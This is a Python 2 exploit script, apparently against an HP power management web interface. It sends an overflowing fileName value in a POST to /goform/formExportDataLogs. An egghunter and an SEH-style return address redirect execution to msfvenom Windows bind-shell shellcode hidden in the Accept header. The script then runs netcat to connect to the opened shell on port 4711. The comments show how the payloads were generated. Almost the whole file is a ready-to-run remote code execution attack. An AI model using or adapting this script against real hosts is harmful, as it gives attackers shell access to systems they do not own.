#!/usr/bin/python
print "Usage: python hpm_exploit.py <Remote IP Address>"
#test

import urllib
import os
import sys
import struct
import time
from socket import *

try:
   HOST  = sys.argv[1]
except IndexError:
   print "Usage: %s HOST" % sys.argv[0]
   sys.exit()

PORT  = 80

#msfvenom -p windows/shell_bind_tcp LHOST=<IP> LPORT=4711  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86 --platform windows -f python

egg="eggzeggz"
buf= egg
buf += "\x29\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x82\x8e\xb7\xe3\x83\xee\xfc\xe2\xf4\x7e\x66"
buf += "\x35\xe3\x82\x8e\xd7\x6a\x67\xbf\x77\x87\x09\xde\x87"
buf += "\x68\xd0\x82\x3c\xb1\x96\x05\xc5\xcb\x8d\x39\xfd\xc5"
buf += "\xb3\x71\x1b\xdf\xe3\xf2\xb5\xcf\xa2\x4f\x78\xee\x83"
buf += "\x49\x55\x11\xd0\xd9\x3c\xb1\x92\x05\xfd\xdf\x09\xc2"
buf += "\xa6\x9b\x61\xc6\xb6\x32\xd3\x05\xee\xc3\x83\x5d\x3c"
buf += "\xaa\x9a\x6d\x8d\xaa\x09\xba\x3c\xe2\x54\xbf\x48\x4f"
buf += "\x43\x41\xba\xe2\x45\xb6\x57\x96\x74\x8d\xca\x1b\xb9"
buf += "\xf3\x93\x96\x66\xd6\x3c\xbb\xa6\x8f\x64\x85\x09\x82"
buf += "\xfc\x68\xda\x92\xb6\x30\x09\x8a\x3c\xe2\x52\x07\xf3"
buf += "\xc7\xa6\xd5\xec\x82\xdb\xd4\xe6\x1c\x62\xd1\xe8\xb9"
buf += "\x09\x9c\x5c\x6e\xdf\xe6\x84\xd1\x82\x8e\xdf\x94\xf1"
buf += "\xbc\xe8\xb7\xea\xc2\xc0\xc5\x85\x71\x62\x5b\x12\x8f"
buf += "\xb7\xe3\xab\x4a\xe3\xb3\xea\xa7\x37\x88\x82\x71\x62"
buf += "\x89\x8a\xd7\xe7\x01\x7f\xce\xe7\xa3\xd2\xe6\x5d\xec"
buf += "\x5d\x6e\x48\x36\x15\xe6\xb5\xe3\x90\xe9\x3e\x05\xe8"
buf += "\x9e\xe1\xb4\xea\x4c\x6c\xd4\xe5\x71\x62\xb4\xea\x39"
buf += "\x5e\xdb\x7d\x71\x62\xb4\xea\xfa\x5b\xd8\x63\x71\x62"
buf += "\xb4\x15\xe6\xc2\x8d\xcf\xef\x48\x36\xea\xed\xda\x87"
buf += "\x82\x07\x54\xb4\xd5\xd9\x86\x15\xe8\x9c\xee\xb5\x60"
buf += "\x73\xd1\x24\xc6\xaa\x8b\xe2\x83\x03\xf3\xc7\x92\x48"
buf += "\xb7\xa7\xd6\xde\xe1\xb5\xd4\xc8\xe1\xad\xd4\xd8\xe4"
buf += "\xb5\xea\xf7\x7b\xdc\x04\x71\x62\x6a\x62\xc0\xe1\xa5"
buf += "\x7d\xbe\xdf\xeb\x05\x93\xd7\x1c\x57\x35\x57\xfe\xa8"
buf += "\x84\xdf\x45\x17\x33\x2a\x1c\x57\xb2\xb1\x9f\x88\x0e"
buf += "\x4c\x03\xf7\x8b\x0c\xa4\x91\xfc\xd8\x89\x82\xdd\x48"
buf += "\x36"



#/usr/share/metasploit-framework/tools/exploit/egghunter.rb -f python -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%\x1a' -e eggz -v 'eggshell'

eggshell =  ""
eggshell += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"
eggshell += "\x3c\x05\x5a\x74\xef\xb8\x65\x67\x67\x7a\x89\xd7"
eggshell += "\xaf\x75\xea\xaf\x75\xe7\xff\xe7"


buffer = "\x41" * (721 -len(eggshell))
buffer +="\x90"*30 + eggshell
buffer +="\xeb\xc2\x90\x90"           #JMP SHORT 0xC2 
buffer += "\xd5\x74\x41" 	      #pop esi # pop ebx # ret 10 (DevManBE.exe)
 

content= "dataFormat=comma&exportto=file&fileName=%s" % urllib.quote_plus(buffer)
content+="&bMonth=03&bDay=12&bYear=2017&eMonth=03&eDay=12&eYear=2017&LogType=Application&actionType=1%253B"

payload =  "POST /goform/formExportDataLogs HTTP/1.1\r\n"
payload += "Host: %s\r\n" % HOST
payload += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n"
payload += "Accept: %s\r\n" % buf
payload += "Referer: http://%s/Contents/exportLogs.asp?logType=Application\r\n" % HOST
payload += "Content-Type: application/x-www-form-urlencoded\r\n"
payload += "Content-Length: %s\r\n\r\n" % len(content)
payload += content

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
print "[+] Payload Fired... She will be back in less than a min..."
s.send(payload)
print "[+] Give me 30 Sec!"
time.sleep(30)
os.system("nc -nv " + HOST +" 4711")
s.close()
#note if you didn't get a bindshell, you may have to bump it to a minute time.sleep(60).

